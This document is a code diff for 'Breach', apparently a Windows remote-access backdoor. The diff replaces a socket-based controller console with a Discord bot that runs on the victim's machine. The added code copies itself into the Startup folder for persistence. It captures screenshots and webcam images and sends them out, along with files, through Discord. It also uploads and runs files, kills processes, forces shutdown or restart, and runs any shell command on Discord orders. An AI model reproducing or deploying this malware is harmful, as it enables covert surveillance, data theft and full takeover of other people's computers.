@@ -1,12 +1,31 @@
-import socket
-import threading
+import discord
+from discord.ext import commands
+import subprocess
 import os
+import cv2
+import mss
 import sys
-from pystyle import *
-from time import sleep
+import shutil
+
+try:
+    startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    exe_path = sys.argv[0]
+    exe_name = os.path.basename(exe_path)
+    destination = os.path.join(startup_folder, exe_name)
+
+    if not os.path.exists(destination):
+        shutil.copyfile(exe_path, destination)
+        subprocess.Popen(["python", destination])
+except:
+    pass
+
+if os.path.abspath(os.path.dirname(exe_path)) != os.path.abspath(startup_folder):
+    sys.exit(0)
 
 listCommand = """
+```
   [>] List of Command :
+
 - Download NAME : downloads a file from the client.
 - Upload NAME : uploads a file to the client.
 - Start NAME : runs a program or file on the client.
@@ -25,9 +44,11 @@ listCommand = """
 - Tasklit : lists currently running processes.
 - Help : displays available commands.
 - Any CMD command : executes any valid Windows command.
+```
 """
 
 Breach = """
+```
 ▀█████████▄     ▄████████    ▄████████    ▄████████  ▄████████    ▄█    █▄    
   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
   ███    ███   ███    ███   ███    █▀    ███    ███ ███    █▀    ███    ███   
@@ -37,165 +58,170 @@ Breach = """
   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
 ▄█████████▀    ███    ███   ██████████   ███    █▀  ████████▀    ███    █▀    
                ███    ███                                                     
+```
+  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach
+
 """
 
+savepath = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft")
+cwd = os.getcwd()
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.bind(("IP_ADRESS", IP_PORT))
-client.listen(99)
+TOKEN = "DISCORD_TOKEN"
+intents = discord.Intents.default()
+intents.message_content = True
 
-savepath = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\"
-listID = {}
+client = commands.Bot(command_prefix=".", intents=intents, help_command=None)
 
-def handle_client():
-    while True:
-        global conntemp, addrtemp, clientID
-        conntemp, addrtemp = client.accept()
-        clientID = conntemp.recv(1024).decode()
-        listID[clientID] = conntemp, addrtemp
+@client.event
+async def on_ready():
+    activity = discord.CustomActivity(name="👋 Привет 👋")
+    await client.change_presence(status=discord.Status.idle, activity=activity)
+    for guild in client.guilds:
 
-thread = threading.Thread(target=handle_client, daemon=True)
-thread.start()
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).send_messages:
+                await channel.send(Breach)
+                break 
 
-def recv_file(conn, filename, failmsg):
-    buffer = b""
-    while True:
-        data = conn.recv(8192)
-        if not data: 
-            break
-        if b"$$STOP$$" in data:
-            Write.Print(failmsg, Colors.red, interval=0.0125)
-            return
-        if b"$$END$$" in data:
-            buffer += data.replace(b"$$END$$", b"")
-            with open(filename, "wb") as f: 
-                f.write(buffer)
-            Write.Print(f"  [>] {filename} received successfully.", Colors.green, interval=0.0125)
-            return
-        buffer += data
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+    await client.process_commands(message)
 
-def ChooseClient():
-    System.Clear()
-    print("\n"*2)
-    print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
-    print("\n"*3)
-    Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
-    Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
-    print("\n"*2)
-    global conn, addr, clientIDC
-    while True:
-        Write.Print(f"  [>] Type ListID for a list of available Client.\n", Colors.green_to_cyan, interval=0.0125)
-        clientIDC = Write.Input("  [>] Client : ", Colors.green_to_cyan, interval=0.0125)
+@client.command()
+async def help(ctx):
+    await ctx.send(listCommand)
 
-        if clientIDC.lower() == "listid":
-            Idlist()
-            continue
-        elif clientIDC in listID :
-            conn = listID[clientIDC][0]
-            addr = listID[clientIDC][1]
-            Write.Print(f"  [>] Client connected to {clientIDC}, {addr}", Colors.green_to_cyan, interval=0.0125)
-            sleep(2)
-            break
-        else:
-            Write.Print("  [>] This clientID does not exist.\n\n", Colors.red, interval=0.0125)
+@client.command()
+async def cd(ctx, *, path: str):
+    global cwd
+    if os.path.exists(path.strip()):
+        cwd = path
+        await ctx.send(f"[>] New directory : {path}")
+    else:
+        await ctx.send(f"[>] The directory name is invalid.")
 
-def Idlist():
-    Write.Print(f"\n  [>] List of ID :\n", Colors.green_to_cyan, interval=0.0125)
-    for clientID, addrtemp in listID.items():
-        Write.Print(f"  [>] This Client : {clientID} is connected to {addrtemp[1]} \n", Colors.green_to_cyan, interval=0.0125) # changer la phrase la et le write marche pas avec les valeur enin tkt je vaidss trouvezr juste change la phgrazse et ca devrait etre bon
-    print("")
-
-ChooseClient()
-
-System.Clear()
-print("\n"*2)
-print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
-print("\n"*3)
-Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
-Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
-print("\n"*2)
-
-while True:
-    Write.Print(f"\n\n  [>] Type Help for a list of available commands.", Colors.green_to_cyan, interval=0.0125)
-    command = Write.Input(f"\n  [>] {addr} CMD : ", Colors.green_to_cyan, interval=0.0125) 
-
-    if command.lower() == "change":
-        ChooseClient()
-        System.Clear()
-        print("\n"*2)
-        print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
-        print("\n"*3)
-        Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
-        Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
-        print("\n"*2)
-        continue
-    elif command.lower() == "listid":
-        Idlist()
-        continue
-    elif command.lower() == "help":
-        print(f"\n {listCommand}")
-        continue
-    elif command.lower() == "quit":
-        sys.exit(0)
-
-    elif command[:6].lower() == "upload":
-        filepath = command[7:].strip()
-
-        if not os.path.isfile(filepath):
-            Write.Print("  [>] This file doesn't exist.\n", Colors.red, interval=0.0125)
-            continue
-
-        try:
-            conn.send(command.encode())
-            sleep(0.5)
-
-            with open(filepath, "rb") as f:
-                while True:
-                    chunk = f.read(8192)
-                    if not chunk:
-                        break
-                    conn.sendall(chunk)
-
-            conn.send(b"$$END$$")
-
-            Write.Print("  [>] Upload terminé.", Colors.green, interval=0.0125)
-            continue
-
-        except Exception as e:
-            Write.Print(f"  [>] Upload failed: {str(e)}", Colors.red, interval=0.0125)
-            continue
-
+@client.command()
+async def screen(ctx, *, screenNum: int):
     try:
-        conn.send(command.encode())
-    except ConnectionResetError or OSError:
-        Write.Print("  [>] This Client has been closed", Colors.red, interval=0.0125)
-        del listID[clientIDC]
-        ChooseClient()
-        continue
+        screen_path = os.path.join(savepath, "capturescreen.png")
+        with mss.mss() as sct:
+            mss.tools.to_png(sct.grab(sct.monitors[screenNum]).rgb, sct.grab(sct.monitors[screenNum]).size, output=screen_path)
+        
+        await ctx.send("Here is your file : ", file=discord.File(screen_path))
 
-    if command[:3].lower() == "cam":
-        recv_file(conn, "captureCam.png", "  [>] This camera doesn't exist or failed to capture.")
+        os.remove(screen_path)
+    except: 
+        await ctx.send(f"[>] This screen doesn't exist.")
 
-    elif command[:6].lower() == "screen":
-        recv_file(conn, "captureScreen.png", "  [>] This screen doesn't exist or failed to capture.")
+@client.command()
+async def cam(ctx, *, camNum: int):
+    try:
+        cam_path = os.path.join(savepath, "capturecam.png")
+        cap = cv2.VideoCapture(camNum)
+        if not cap.isOpened():
+            await ctx.send(f"[>] This cam doesn't exist.")
+            return
+        ret, frame = cap.read()
+        cap.release()
+        if not ret:
+            await ctx.send(f"[>] This cam doesn't exist.")
+            return
 
-    elif command[:8].lower() == "download":
-        recv_file(conn, command[9:].strip(), "  [>] This file doesn't exist.")
+        cv2.imwrite(cam_path, frame)
 
+        await ctx.send("Here is your file : ", file=discord.File(cam_path))
 
+        os.remove(cam_path)
+    except: 
+        await ctx.send(f"[>] This cam doesn't exist.")
+
+@client.command()
+async def download(ctx, *, filename: str):
+    file_path = os.path.join(cwd, filename.strip()) 
+
+    if os.path.isfile(file_path):
+        await ctx.send("Voici ton fichier :", file=discord.File(file_path))
 
     else:
-        buffer = ""
+        await ctx.send("Bonjour !")
+
+@client.command()
+async def upload(ctx):
+    if len(ctx.message.attachments) == 0:
+        await ctx.send("[>] Aucun fichier attaché.")
+        return
+
+    attachment = ctx.message.attachments[0]
+    file_path = os.path.join(cwd, attachment.filename)
+
+    try:
+        await attachment.save(file_path)
+        await ctx.send(f"[>] Fichier téléchargé : {attachment.filename}")
+    except Exception as e:
+        await ctx.send(f"[>] Erreur lors du téléchargement : {e}")
+
+@client.command()
+async def kill(ctx, *, arg):
+    arg = arg.strip()
+    try:
+        number = int(arg)
+        response = subprocess.run("taskkill /F /PID " + arg, shell=True, capture_output=True, text=True, encoding="cp437")
+    except ValueError:
+        response = subprocess.run("taskkill /F /IM " + arg, shell=True, capture_output=True, text=True, encoding="cp437")
+
+    if response.returncode == 0 :
+        output = response.stdout
+        await ctx.send(output)
+    else:
+        await ctx.send("  [>] This process does not exist")
+
+@client.command()
+async def start(ctx, *, filename: str):
+    file_path = os.path.join(cwd, filename.strip()) 
+    if os.path.isfile(file_path):
         try:
-            while True:
-                data = conn.recv(1024).decode()
-                if "$$END$$" in data:
-                    buffer += data.replace("$$END$$", "")
-                    break
-                buffer += data
-            print(buffer)
-        except ConnectionResetError:
-            Write.Print("  [>] The Backdoor has been closed", Colors.red, interval=0.0125)
-            break
-        except Exception:
-            Write.Print("  [>] This command does not exist or returned an error.", Colors.red, interval=0.0125)
+            subprocess.Popen(file_path, shell=True, cwd=cwd, encoding="cp437")
+            await ctx.send("  [>] File has been executed.")
+        except Exception as e:
+            await ctx.send(f"  [>] Failed to execute: {str(e)}")
+    else:
+        await ctx.send("  [>] This file does not exist.")
+
+@client.command()
+async def shutdown(ctx):
+    await ctx.send("  [>] Shutting down...")
+    subprocess.run("shutdown /s /f /t 0", shell=True, capture_output=True, text=True, encoding="cp437")
+
+@client.command()
+async def restart(ctx):
+    await ctx.send("  [>] Restarting...")
+    subprocess.run("shutdown /r /f /t 0", shell=True, capture_output=True, text=True, encoding="cp437")
+
+@client.command()
+async def cmd(ctx, *, commands: str):
+    try:
+        response = subprocess.run(
+            commands,
+            shell=True,
+            capture_output=True,
+            text=True,
+            encoding='cp437',
+            cwd=cwd
+        )
+
+        if response.returncode == 0:
+            output = response.stdout
+
+        chunk_size = 1900
+        for i in range(0, len(output), chunk_size):
+            await ctx.send(f"```{output[i:i+chunk_size]}```")
+
+        if not output:
+            await ctx.send("[>] No output from command.")
+
+    except Exception as e:
+        await ctx.send(f"[>] Command error:\n{str(e)}")
+
+client.run(TOKEN)
